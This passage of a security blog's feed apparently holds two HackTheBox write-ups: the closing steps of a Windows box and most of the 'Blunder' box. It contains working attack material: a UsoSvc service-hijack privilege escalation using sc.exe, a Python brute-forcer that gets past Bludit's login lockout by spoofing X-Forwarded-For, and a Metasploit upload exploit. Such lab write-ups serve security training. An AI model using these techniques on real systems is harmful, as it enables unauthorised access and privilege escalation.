&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)&lt;/span&gt;
&lt;span class="code-line"&gt;    OS Build Number: 17763&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-0836 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://exploit-db.com/exploits/46718&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-0841 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://github.com/rogue-kdc/CVE-2019-0841&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://rastamouse.me/tags/cve-2019-0841/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-1064 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://www.rythmstick.net/posts/cve-2019-1064/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-1130 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://github.com/S3cur3Th1sSh1t/SharpByeBear&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-1253 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://github.com/padovah4ck/CVE-2019-1253&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-1315 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-1385 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://www.youtube.com/watch?v=K6gHnr-VkAg&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-1388 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://github.com/jas502n/CVE-2019-1388&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      [!] CVE-2019-1405 : VULNERABLE&lt;/span&gt;
&lt;span class="code-line"&gt;        [&amp;gt;] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As the &lt;a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/"&gt;article&lt;/a&gt;
precise we can run commands as &lt;code&gt;SYSTEM&lt;/code&gt; on the box so we stop the service,
configure it to copy the root flag in &lt;code&gt;C:\a.txt&lt;/code&gt; and start the service again.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\windows\system32\inetsrv&amp;gt;sc.exe stop UsoSvc&lt;/span&gt;
&lt;span class="code-line"&gt;sc.exe stop UsoSvc&lt;/span&gt;
&lt;span class="code-line"&gt;[SC] ControlService FAILED 1062:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;The service has not been started.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32\inetsrv&amp;gt;sc config UsoSvc binPath=&amp;quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &amp;gt; C:\a.txt&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;sc config UsoSvc binPath=&amp;quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &amp;gt; C:\a.txt&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;[SC] ChangeServiceConfig SUCCESS&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\windows\system32\inetsrv&amp;gt;sc.exe start UsoSvc&lt;/span&gt;
&lt;span class="code-line"&gt;sc.exe start UsoSvc&lt;/span&gt;
&lt;span class="code-line"&gt;[SC] StartService FAILED 1053:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;The service did not respond to the start or control request in a timely fashion.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can now get the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\windows\system32\inetsrv&amp;gt;type C:\a.txt&lt;/span&gt;
&lt;span class="code-line"&gt;type C:\a.txt&lt;/span&gt;
&lt;span class="code-line"&gt;66f9b552d94ea7c55919dc1bfbaff7e1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was supposed to be easy. Clearly the root part took me way too long. My
metasploit was outdated and doesn't had the post module for TeamViewer. And
after getting the TeamViewer credentials I really tried to connect using the
solution.&lt;/p&gt;
&lt;p&gt;Nevertheless the box was really interesting.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="windows"></category><category term="umbraco"></category><category term="teamviewer"></category><category term="metasploit"></category><category term="msfvenom"></category></entry><entry><title>HTB: Blunder</title><link href="https://maggick.fr/2020/10/htb-blunder.html" rel="alternate"></link><published>2020-10-19T08:45:00+02:00</published><updated>2020-10-19T08:45:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-10-19:/2020/10/htb-blunder.html</id><summary type="html">&lt;p&gt;&lt;img alt="Blunder Card" class="align-left" src="/media/2020.10/blunder_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/254"&gt;Blunder&lt;/a&gt;.
This box was created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt; and publish on
May 30, 2020. The box is rated as an easy box. It implies enumeration,
generating a custom wordlist with &lt;code&gt;cewl&lt;/code&gt;, using metasploit, cracking a password
and a &lt;code&gt;sudo&lt;/code&gt; vulnerability.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.10/blunder_card.png" alt="Blunder Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/254"&gt;Blunder&lt;/a&gt;.
This box was created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt; and publish on
May 30, 2020. The box is rated as an easy box. It implies enumeration,
generating a custom wordlist with &lt;code&gt;cewl&lt;/code&gt;, using metasploit, cracking a password
and a &lt;code&gt;sudo&lt;/code&gt; vulnerability.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 is open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Jun  1 05:39:09 2020 as: nmap -oN nmap -sSV -p- 10.10.10.191&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.191&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.60s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE  SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;21/tcp closed ftp&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Mon Jun  1 06:01:11 2020 -- 1 IP address (1 host up) scanned in 1322.38 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website present three "interesting" facts.&lt;/p&gt;
&lt;p&gt;&lt;img alt="home page" src="/media/2020.10/blunder_01.png"&gt;&lt;/p&gt;
&lt;p&gt;There is nothing really interesting on the site.
We notice two external links, one to &lt;a href="https://www.twitter.com/WhortonMr"&gt;the box creator twitter
account&lt;/a&gt; the other one to &lt;a href="https://www.computerhope.com/history/1996.htm"&gt;computer hope page
for 1996&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;robots.txt&lt;/code&gt; file is a basic one.
We launch a &lt;a href="https://github.com/ffuf/ffuf"&gt;fuff&lt;/a&gt; scan with a few extensions. And
discover an interesting file: &lt;code&gt;todo.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ./ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.10.10.191/FUZZ  -mc 200 -e .txt,.php,.php.bak,.pdf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\&lt;/span&gt;
&lt;span class="code-line"&gt;       /\ \__/ /\ \__/  __  __  /\ \__/&lt;/span&gt;
&lt;span class="code-line"&gt;       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\&lt;/span&gt;
&lt;span class="code-line"&gt;        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/&lt;/span&gt;
&lt;span class="code-line"&gt;         \ \_\   \ \_\  \ \____/  \ \_\&lt;/span&gt;
&lt;span class="code-line"&gt;          \/_/    \/_/   \/___/    \/_/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;       v1.0.2&lt;/span&gt;
&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt; :: Method           : GET&lt;/span&gt;
&lt;span class="code-line"&gt; :: URL              : http://10.10.10.191/FUZZ&lt;/span&gt;
&lt;span class="code-line"&gt; :: Extensions       : .txt .php .php.bak .pdf&lt;/span&gt;
&lt;span class="code-line"&gt; :: Follow redirects : false&lt;/span&gt;
&lt;span class="code-line"&gt; :: Calibration      : false&lt;/span&gt;
&lt;span class="code-line"&gt; :: Timeout          : 10&lt;/span&gt;
&lt;span class="code-line"&gt; :: Threads          : 40&lt;/span&gt;
&lt;span class="code-line"&gt; :: Matcher          : Response status: 200&lt;/span&gt;
&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                        [Status: 200, Size: 8162, Words: 841, Lines: 197]&lt;/span&gt;
&lt;span class="code-line"&gt;0                       [Status: 200, Size: 8162, Words: 841, Lines: 197]&lt;/span&gt;
&lt;span class="code-line"&gt;about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]&lt;/span&gt;
&lt;span class="code-line"&gt;install.php             [Status: 200, Size: 30, Words: 5, Lines: 1]&lt;/span&gt;
&lt;span class="code-line"&gt;LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]&lt;/span&gt;
&lt;span class="code-line"&gt;robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]&lt;/span&gt;
&lt;span class="code-line"&gt;robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]&lt;/span&gt;
&lt;span class="code-line"&gt;todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]&lt;/span&gt;
&lt;span class="code-line"&gt;:: Progress: [23070/23070] :: Job [1/1] :: 34 req/sec :: Duration: [0:11:15] :: Errors: 0 ::&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The content of the &lt;code&gt;todo.txt&lt;/code&gt; file is the following:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We deduce that the website use a CMS and that the user might be &lt;code&gt;fergus&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We quickly discover the &lt;code&gt;/admin&lt;/code&gt; page which is the login page for the CMS:
&lt;a href="https://www.bludit.com/"&gt;bludit&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Searchspoilt&lt;/code&gt; provide two authenticated exploit for &lt;code&gt;bludit&lt;/code&gt;. A Google search
"bludit authentication bypass" direct us to &lt;a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/"&gt;an article about bypass the bludit
brute force mitigation mechanism&lt;/a&gt;
which contain a POC in Python.&lt;/p&gt;
&lt;p&gt;We got an user (&lt;code&gt;fergus&lt;/code&gt;) but no password.
We use &lt;a href="https://github.com/digininja/CeWL"&gt;cewl&lt;/a&gt; to generate a list of word from
the website. As mentioned earlier there is two offsite links so we configure
&lt;code&gt;cewl&lt;/code&gt; to just parse our page with &lt;code&gt;-d 1&lt;/code&gt;. Also we want to save the password in
a file &lt;code&gt;pass&lt;/code&gt; with the &lt;code&gt;-w&lt;/code&gt; option.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cewl -d 1 http://10.10.10.191 -w pass&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We quickly rewrite the POC in order to load the passwords from our &lt;code&gt;pass&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://10.10.10.191&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;login_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;host&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/admin/login&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;fergus&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pass&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;login_page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;login_url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;csrf_token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input.+?name=&amp;quot;tokenCSRF&amp;quot;.+?value=&amp;quot;(.+?)&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;login_page&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[*] Trying: &lt;/span&gt;&lt;span class="si"&gt;{p}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s1"&gt;&amp;#39;X-Forwarded-For&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s1"&gt;&amp;#39;User-Agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s1"&gt;&amp;#39;Referer&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;login_url&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s1"&gt;&amp;#39;tokenCSRF&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;csrf_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="s1"&gt;&amp;#39;save&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;login_result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;login_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;location&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;login_result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/admin/dashboard&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;login_result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;location&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;SUCCESS: Password found!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Use &lt;/span&gt;&lt;span class="si"&gt;{u}&lt;/span&gt;&lt;span class="s1"&gt;:&lt;/span&gt;&lt;span class="si"&gt;{p}&lt;/span&gt;&lt;span class="s1"&gt; to login.&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;break&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run the script and found the password &lt;code&gt;RolandDeschain&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$python3 bludit_auth_bypass.py&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Trying: Load&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Trying: Plugins&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Trying: and&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Trying: best&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Trying: fictional&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Trying: character&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Trying: RolandDeschain&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;SUCCESS: Password found!&lt;/span&gt;
&lt;span class="code-line"&gt;Use fergus:RolandDeschain to login.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="metasploit"&gt;metasploit&lt;/h2&gt;
&lt;p&gt;One of the two authenticated exploit shown by searchsploit is a metasploit
module. So we fire up &lt;code&gt;msf&lt;/code&gt; and search for &lt;code&gt;bludit&lt;/code&gt;. Only one module pop up. We
directly use this module and set the different options. Once run we get a
&lt;code&gt;meterpreter&lt;/code&gt; on the box as &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 &amp;gt; use exploit/linux/http/bludit_upload_images_exec&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set rhost 10.10.10.191&lt;/span&gt;
&lt;span class="code-line"&gt;rhost =&amp;gt; 10.10.10.191&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set BLUDITPASS RolandDeschain&lt;/span&gt;
&lt;span class="code-line"&gt;BLUDITPASS =&amp;gt; RolandDeschain&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set BLUDITUSER fergus&lt;/span&gt;
&lt;span class="code-line"&gt;BLUDITUSER =&amp;gt; fergus&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; run&lt;/span&gt;
